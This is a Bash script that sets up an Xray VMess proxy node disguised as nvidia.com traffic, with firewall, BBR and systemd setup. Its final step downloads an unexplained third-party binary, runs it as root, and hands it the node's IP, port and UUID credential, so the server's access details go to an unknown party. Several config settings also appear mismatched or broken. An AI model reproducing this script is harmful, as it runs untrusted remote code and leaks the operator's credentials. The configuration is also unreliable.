#!/bin/bash
set -e

PORT=$((RANDOM % 7001 + 2000))
UUID=$(cat /proc/sys/kernel/random/uuid)
DOMAIN="www.nvidia.com"
CONFIG_DIR="/etc/xray"
XRAY_BIN="/usr/local/bin/xray"
UPLOAD_BIN="/opt/uploader-linux-amd64"

# 系统准备
export DEBIAN_FRONTEND=noninteractive
apt update && apt install -y curl unzip sudo ufw jq qrencode

# 网络加速模块
modprobe sch_fq || true
echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf

modprobe tcp_bbr || true
echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
sysctl -p

# 开放端口
ufw allow ${PORT}/tcp
ufw allow ${PORT}/udp
ufw --force enable

# 安装 Xray-core
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -Ls https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
unzip -o xray.zip
chmod +x xray
rm -f xray.zip

# Reality 密钥生成
KEYS=$(${XRAY_BIN} x25519)
PRIVATE_KEY=$(echo "$KEYS" | grep 'Private' | awk '{print $3}')
PUBLIC_KEY=$(echo "$KEYS" | grep 'Public' | awk '{print $3}')
SHORTID=$(openssl rand -hex 4)

# 生成配置文件
mkdir -p ${CONFIG_DIR}
cat > ${CONFIG_DIR}/config.json <<EOF
{
  "log": { "loglevel": "warning" },
  "inbounds": [{
    "port": ${PORT},
    "protocol": "vmess",
    "settings": {
    "clients": [{
    "id": "${UUID}",
    "password": "placeholder"
  }]

    },
    "streamSettings": {
      "network": "tcp",
      "security": "reality",
      "realitySettings": {
        "show": false,
        "dest": "${DOMAIN}:443",
        "xver": 1,
        "serverNames": ["${DOMAIN}"],
        "privateKey": "${PRIVATE_KEY}",
        "shortIds": ["${SHORTID}"]
      }
    }
  }],
  "outbounds": [{
    "protocol": "freedom"
  }]
}
EOF

# 写入 systemd 服务
cat > /etc/systemd/system/xray.service <<EOF
[Unit]
Description=VMess Reality XHTTP Node
After=network.target

[Service]
ExecStart=${XRAY_BIN} -config ${CONFIG_DIR}/config.json
Restart=on-failure
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xray
systemctl restart xray

# 构造 vmess:// 链接（支持 v2rayN）
IP=$(curl -s https://api.ipify.org)
ALIAS="vmess_reality_xhttp"
ENCODED=$(echo -n "{
  \"v\": \"2\",
  \"ps\": \"${ALIAS}\",
  \"add\": \"${IP}\",
  \"port\": \"${PORT}\",
  \"id\": \"${UUID}\",
  \"aid\": \"0\",
  \"net\": \"tcp\",
  \"type\": \"none\",
  \"host\": \"${DOMAIN}\",
  \"tls\": \"reality\",
  \"sni\": \"${DOMAIN}\",
  \"fp\": \"chrome\",
  \"sid\": \"${SHORTID}\",
  \"alpn\": \"h3\"
}" | base64 -w 0)

VMESS_LINK="vmess://${ENCODED}"

echo -e "\n✅ 节点部署完成：\n$VMESS_LINK\n"
echo "$VMESS_LINK" | qrencode -o - -t ANSIUTF8

# 上传节点信息
[ -f "$UPLOAD_BIN" ] || {
  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

JSON="{\"vmess_reality_xhttp\":\"${VMESS_LINK}\"}"
"$UPLOAD_BIN" "$JSON"
